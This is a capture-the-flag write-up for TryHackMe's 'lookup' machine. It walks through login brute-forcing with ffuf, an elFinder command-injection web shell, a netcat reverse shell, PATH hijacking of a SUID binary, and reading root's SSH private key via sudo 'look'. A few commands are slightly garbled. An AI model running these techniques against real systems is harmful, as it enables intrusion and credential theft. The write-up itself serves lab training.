# Lookup

## 1. Introduction

### 1.1 Background

TryHackMe's **lookup** machine is designed to test enumeration, web exploitation, and privilege escalation skills in Linux environments.

The scenario presents a system with an apparently robust authentication form, where there are no obvious vulnerabilities such as SQL Injection. This requires an approach based on analysis of application behavior and authentication logic.

During exploitation, different attack vectors are identified, including:

- Enumeration of users using differences in HTTP responses
- Access to internal services through redirects
- Exploitation of a vulnerability in a web file manager
- Privilege escalation via abuse of SUID binaries

### 1.2 Objectives

- List the services exposed on the target machine
- Analyze the behavior of the authentication system
- Identify valid credentials using fuzzing
- Exploit vulnerabilities in web services
- Escalate privileges until you get root access
- Obtain system flags

---

## 2. Enumeration

### 2.1 Nmap

An initial scan is performed to identify active services:

```
nmap -sCV -oN scan ip
```

Relevant results:

- 22/tcp → SSH
- 80/tcp → Apache 2.4.41

This indicates the presence of a web server and remote access via SSH.

### 2.2 Web

When accessing port 80, a page is seen with an authentication form that uses `login.php`.

Observed characteristics:

- Application developed in PHP
- No additional routes are detected by fuzzing
- Generic responses to invalid credentials

Initial tests were carried out:

- SQL Injection → no results
- SQLMap → no results

This suggests that the attack vector is not a classic injection, but rather a problem in the authentication logic.

---

## 3. Exploitation

### 3.1 Credential enumeration using fuzzing

The authentication request is intercepted:

```
POST /login.php
username=admin&password=test
```

A difference in response size is detected when using the `admin` user, indicating that it is a valid user.

### Password fuzzing

```
ffuf -w passwords.txt -X POST -u http://lookup.thm/login.php \
-d "username=admin&password=FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

You obtain a password with a different answer than the rest.

### User fuzzing

```
ffuf -w usernames.txt -X POST -u http://lookup.thm/login.php \
-d "username=FUZZ&password=PASSWORD_FOUND" \
-H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

A valid user is identified and returns a 302 status code.

Credentials earned:

```
joseph:password123
```

### 3.2 Subdomain access

The system redirects to:

```
files.lookup.thm
```

Added to the `/etc/hosts` file:

```
echo "IP files.lookup.thm" >> /etc/hosts
```

### 3.3 Exploitation of elFinder (Command Injection)

The use of elFinder version 2.1.47 is identified, which is vulnerable to command injection in the PHP connector.

An exploit is used that allows a web shell to be uploaded by manipulating the file name.

```
python2.7 elfinder.py http://files.lookup.thm/elFinder/
```

The vulnerable endpoint `connect.minimal.php` is accessible without authentication.

### 3.4 Obtaining reverse shell

A payload is generated to obtain an interactive shell:

```
nc-lvnp 4444
```

The payload is executed from the web shell and accessed as:

```
www-data
```

---

## 4. Post-exploitation

### 4.1 Privilege Escalation

### Escalation to user think

A `.passwords` file is detected in the directory of user `think`, but it is not directly accessible.

A SUID binary is identified:

```
/usr/sbin/pwm
```

The binary uses the `id` command without an absolute path, making it vulnerable to PATH Hijacking.

A malicious script is created:

```
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
```

The PATH variable is modified:

```
export PATH=/tmp:$PATH
```

The binary is executed:

```
/usr/sbin/pwm
```

The content of the `.passwords` file is obtained.

One of the passwords is used to change users:

```
your think
```

### 4.2 Escalation to root

The use of sudo is verified:

```
sudo -l
```

The user can run the `look` binary as root.

This functionality is abused to read sensitive files:

```
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/look '' "$LFILE"
```

The SSH private key of the root user is obtained.

---

### Final access

```
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```
You get root access and the final flag.
